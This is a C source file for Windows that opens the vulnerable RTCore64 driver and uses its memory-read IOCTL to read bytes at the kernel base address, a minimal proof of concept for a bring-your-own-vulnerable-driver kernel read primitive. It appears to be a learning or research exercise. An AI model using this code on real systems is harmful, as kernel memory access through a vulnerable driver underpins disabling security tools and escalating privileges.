#include "helpers.h"
#include <psapi.h> // Required for EnumDrivers

// Define IOCTL codes
#define RTCORE64_MEMORY_READ_CODE 0x80002048

struct RTCORE64_MEMORY_READ {
	BYTE		Pad0[8];
	DWORD64		Address;
	BYTE		Pad1[8];
	DWORD		ReadSize;
	DWORD		Value;
	BYTE		Pad3[16];
};

DWORD64 GetKernelBaseAddr() {

	DWORD dwCB = 0;
	DWORD64 dwDrivers[1024];

	// Retrieve the load address for each device driver in the system
	// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
	if (EnumDeviceDrivers(dwDrivers, sizeof(dwDrivers), &dwCB)) {

		// Return the first address in the list, which should be the address of Ntoskrnl
		return (DWORD64)dwDrivers[0];
	}
	return NULL;
}

int main() {

	HANDLE 	hDevice			= NULL; // Handle to device
	DWORD 	dwBytesReturned	= NULL;	// Number of bytes read
	BOOL	bSuccess		= NULL; // Bool to store FALSE/TRUE

	// Open a file handle to the driver using its symbolic link
	// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
	hDevice = CreateFileW(
		L"\\\\.\\RTCore64",			// Symbolic link to RTCore64 driver
		GENERIC_READ,				// Read access
		0,							// No sharing
		NULL,						// Default security attributes
		OPEN_EXISTING,				// Open the existing device
		FILE_ATTRIBUTE_NORMAL,		// Normal file attributes
		NULL						// No template file
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		errorWin32("CreateFile - Failed to open the device");
		return EXIT_FAILURE;
	}
	okay("CreateFileW - Opened file handle to RTCore64 at 0x%p", hDevice);

	// Get the KernelBaseAddr
	DWORD64 dwKernelBase = GetKernelBaseAddr();
	okay("GetKernelBaseAddr - Reading memory 0x%p", dwKernelBase);

	// Initialize struct and set memory to read
	struct RTCORE64_MEMORY_READ memoryRead = { 0 };
	memoryRead.Address = dwKernelBase;			// Target address Kernellbase
	memoryRead.ReadSize = 4;					// Reading 4 bytes

	// Sends control code directly to specified device driver
	// https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol
	bSuccess = DeviceIoControl(
		hDevice,					// Handle to the device
		RTCORE64_MEMORY_READ_CODE,	// IOCTL Code that specifies the operation
		&memoryRead,				// Pointer to input data
		sizeof(memoryRead),			// Size of data
		&memoryRead,				// Output buffer
		sizeof(memoryRead),			// Size of the output buffer
		&dwBytesReturned,			// Number of bytes returned
		NULL						// Overlapped structure
	);
	if (!bSuccess) {
		errorWin32("DeviceIoControl - Failed to open the device and read memory");
		if (hDevice) {
			CloseHandle(hDevice);
			info("CloseHandle - Closed handle to device");
		}
		return EXIT_FAILURE;
	}
	okay("DeviceIoControl - Read memory: 0x%x", memoryRead.Value);

	// Close file handle
	if (hDevice) {
		CloseHandle(hDevice);
		info("CloseHandle - Closed handle to device");
	}

	return EXIT_SUCCESS;
}